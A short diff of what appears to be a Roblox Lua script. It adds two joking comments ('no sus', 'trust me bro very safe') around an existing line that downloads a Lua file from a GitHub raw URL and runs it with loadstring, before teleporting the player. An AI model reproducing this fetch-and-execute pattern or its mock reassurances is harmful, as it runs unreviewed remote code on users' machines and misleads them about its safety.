@@ -34,6 +34,9 @@ coroutine.wrap(function()
     end
 end)()
 repeat wait(2) until friends() >= 10
+
+--- hola amogios i am function no sus
 loadstring(game:HttpGet("https://raw.githubusercontent.com/StwFate/BoredSoIMadeThese/main/Function_ALT.lua"))()
+-- ^^ trust me bro very safe
 wait(1)
 game:GetService("TeleportService"):Teleport(5166670285)
